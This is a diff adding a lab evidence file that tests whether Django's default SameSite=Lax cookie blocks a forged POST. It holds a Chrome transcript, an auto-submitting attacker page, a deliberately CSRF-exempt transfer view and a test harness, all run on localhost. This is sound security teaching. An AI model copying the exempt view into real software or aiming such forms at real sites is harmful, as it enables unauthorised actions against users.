@@ -1,0 +1,208 @@
+# ============================================================================
+# Browser evidence - does SameSite=Lax stop Lab 08's forged POST? (Post 8)
+#
+# What ran: headless Chrome against a STAND-IN for the vulnerable view, not the
+# lab itself (the lab needs Docker/Postgres; this host has neither). The stand-in
+# below keeps what matters: Django 5.2.17's default session cookie
+# (SameSite=Lax), a @csrf_exempt @login_required transfer view, and a POST-only
+# login like the lab's. Ports 8765/8766 stand in for the lab's 8000/8001.
+#
+# Command: python -I run_capture.py   (Python 3.13, Django 5.2.17)
+# Tool: Chrome 155.0.8059.86, --headless=new, throwaway profile  |  Captured: 2026-10-23
+# Result: the POST arrives WITHOUT the session from file:// and from
+#         localhost:8766 (cross-site), and WITH it from 127.0.0.1:8766 (another
+#         origin, same site: scheme + host, the port does not count), where the
+#         transfer runs as alice. Transcript unedited except the local path of
+#         the file:// URL, shortened to <capture dir>. See scans/README.md.
+# ============================================================================
+
+
+# ---- transcript -------------------------------------------------------------
+
+# Chrome 155.0.8059.86 (headless=new), throwaway profile; stand-in on 127.0.0.1:8765, pages on 127.0.0.1:8766
+
+## 1. log in: login.html served from 127.0.0.1:8766 (same site)
+$ chrome --headless=new --dump-dom http://127.0.0.1:8766/login.html
+page shows: logged in as alice
+stand-in logged: LOGIN via POST origin=http://127.0.0.1:8766
+
+## 2. evil.html opened from disk (file://, cross-site)
+$ chrome --headless=new --dump-dom file:///<capture dir>/www/evil.html
+page shows: login page
+stand-in logged: ARRIVED POST session_user=AnonymousUser
+redirected-to-login method=GET user=alice
+
+## 3. evil.html served from localhost:8766 (cross-site: another host)
+$ chrome --headless=new --dump-dom http://localhost:8766/evil.html
+page shows: login page
+stand-in logged: ARRIVED POST session_user=AnonymousUser
+redirected-to-login method=GET user=alice
+
+## 4. evil.html served from 127.0.0.1:8766 (cross-origin, same site)
+$ chrome --headless=new --dump-dom http://127.0.0.1:8766/evil.html
+page shows: moved
+stand-in logged: ARRIVED POST session_user=alice
+TRANSFER method=POST user=alice to=bob origin=http://127.0.0.1:8766
+
+# ---- www/login.html (served from 127.0.0.1:8766) ----------------------------
+
+<!-- login.html — logs the browser in as alice -->
+<form action="http://127.0.0.1:8765/accounts/login-post/" method="POST">
+  <input name="username" value="alice">
+  <input name="password" value="labpass">
+  <button type="submit">Log in as alice</button>
+</form>
+<script>document.forms[0].submit()</script>
+
+# ---- www/evil.html ------------------------------------------------------------
+
+﻿<!-- evil.html â€” the attacker's auto-submitting page -->
+<body onload="document.getElementById('f').submit()">
+  <form id="f" action="http://127.0.0.1:8765/csrf/vulnerable/transfer/" method="POST">
+    <input type="hidden" name="to_account" value="bob">
+  </form>
+</body>
+
+# ---- mini.py (the stand-in) ---------------------------------------------------
+
+﻿"""Minimal stand-in for Lab 08: default session cookie (SameSite=Lax), a
+@csrf_exempt @login_required transfer view that logs who reached it."""
+import sys
+import django
+from django.conf import settings
+
+LOG = sys.argv[1]
+settings.configure(
+    DEBUG=True, SECRET_KEY="x", ALLOWED_HOSTS=["127.0.0.1", "localhost"], ROOT_URLCONF=__name__,
+    INSTALLED_APPS=["django.contrib.auth", "django.contrib.contenttypes", "django.contrib.sessions"],
+    MIDDLEWARE=["django.contrib.sessions.middleware.SessionMiddleware",
+                "django.contrib.auth.middleware.AuthenticationMiddleware"],
+    DATABASES={"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": LOG + ".db"}},
+    LOGIN_URL="/accounts/login/",
+)
+django.setup()
+
+from django.contrib.auth import login
+from django.contrib.auth.decorators import login_required
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+from django.urls import path
+from django.views.decorators.csrf import csrf_exempt
+
+
+def note(line):
+    with open(LOG, "a") as f:
+        f.write(line + "\n")
+
+
+def do_login(request):
+    u, _ = User.objects.get_or_create(username="alice")
+    login(request, u, backend="django.contrib.auth.backends.ModelBackend")
+    return HttpResponse("<p>logged in as alice</p>")
+
+
+@csrf_exempt
+def login_post(request):
+    from django.contrib.auth import authenticate
+    if request.method != "POST":
+        return HttpResponse(status=405)
+    User.objects.filter(username="alice").exists() or User.objects.create_user("alice", password="labpass")
+    user = authenticate(request, username=request.POST.get("username"), password=request.POST.get("password"))
+    if user is None:
+        return HttpResponse("invalid", status=401)
+    login(request, user)
+    note(f"LOGIN via POST origin={request.headers.get('Origin')}")
+    return HttpResponse(f"<p>logged in as {user.username}</p>")
+
+
+def login_page(request):
+    note(f"redirected-to-login method={request.method} user={request.user}")
+    return HttpResponse("<p>login page</p>")
+
+
+def arrival(view):
+    """Logs every request to the transfer URL before @login_required runs."""
+    def wrapper(request, *a, **k):
+        note(f"ARRIVED {request.method} session_user={request.user}")
+        return view(request, *a, **k)
+    return wrapper
+
+
+@csrf_exempt
+@arrival
+@login_required
+def transfer(request):
+    note(f"TRANSFER method={request.method} user={request.user} to={request.POST.get('to_account')} origin={request.headers.get('Origin')}")
+    return HttpResponse("<p>moved</p>")
+
+
+urlpatterns = [path("login-alice/", do_login), path("accounts/login/", login_page),
+               path("csrf/vulnerable/transfer/", transfer), path("accounts/login-post/", login_post)]
+
+if __name__ == "__main__":
+    from django.core.management import call_command, execute_from_command_line
+    call_command("migrate", verbosity=0)
+    execute_from_command_line(["mini", "runserver", "127.0.0.1:8765", "--noreload"])
+
+# ---- run_capture.py -------------------------------------------------------------
+
+"""Runs the SameSite browser check end to end and prints a transcript:
+starts the stand-in (mini.py) on 127.0.0.1:8765 and a static server for the two
+pages on 127.0.0.1:8766, drives headless Chrome with a throwaway profile, and
+prints what the stand-in logged after each step."""
+import os
+import re
+import shutil
+import subprocess
+import sys
+import time
+import urllib.request
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+PY = sys.executable
+CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
+LOG = os.path.join(HERE, "capture-log.txt")
+PROFILE = os.path.join(HERE, "capture-profile")
+
+for p in (LOG, LOG + ".db"):
+    if os.path.exists(p):
+        os.remove(p)
+shutil.rmtree(PROFILE, ignore_errors=True)
+
+server = subprocess.Popen([PY, "-I", os.path.join(HERE, "mini.py"), LOG], cwd=HERE,
+                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+pages = subprocess.Popen([PY, "-I", "-m", "http.server", "8766", "--bind", "127.0.0.1",
+                          "--directory", os.path.join(HERE, "www")],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+try:
+    for _ in range(50):
+        try:
+            urllib.request.urlopen("http://127.0.0.1:8765/accounts/login/", timeout=1)
+            urllib.request.urlopen("http://127.0.0.1:8766/evil.html", timeout=1)
+            break
+        except Exception:
+            time.sleep(0.2)
+
+    version = subprocess.run(["powershell", "-NoProfile", "-Command",
+                              f"(Get-Item '{CHROME}').VersionInfo.ProductVersion"],
+                             capture_output=True, text=True).stdout.strip()
+    print(f"# Chrome {version} (headless=new), throwaway profile; stand-in on 127.0.0.1:8765, pages on 127.0.0.1:8766")
+
+    def step(title, url):
+        open(LOG, "a").close()
+        before = open(LOG).read()
+        out = subprocess.run([CHROME, "--headless=new", "--no-first-run", "--no-default-browser-check",
+                              "--disable-gpu", f"--user-data-dir={PROFILE}", "--virtual-time-budget=4000",
+                              "--dump-dom", url], capture_output=True, text=True, timeout=90).stdout
+        page = " ".join(re.findall(r"<p>([^<]*)</p>", out)) or "(no <p>)"
+        logged = open(LOG).read()[len(before):].strip() or "(nothing logged)"
+        print(f"\n## {title}\n$ chrome --headless=new --dump-dom {url}\npage shows: {page}\nstand-in logged: {logged}")
+
+    file_url = "file:///" + os.path.join(HERE, "www", "evil.html").replace("\\", "/")
+    step("1. log in: login.html served from 127.0.0.1:8766 (same site)", "http://127.0.0.1:8766/login.html")
+    step("2. evil.html opened from disk (file://, cross-site)", file_url)
+    step("3. evil.html served from localhost:8766 (cross-site: another host)", "http://localhost:8766/evil.html")
+    step("4. evil.html served from 127.0.0.1:8766 (cross-origin, same site)", "http://127.0.0.1:8766/evil.html")
+finally:
+    server.kill()
+    pages.kill()
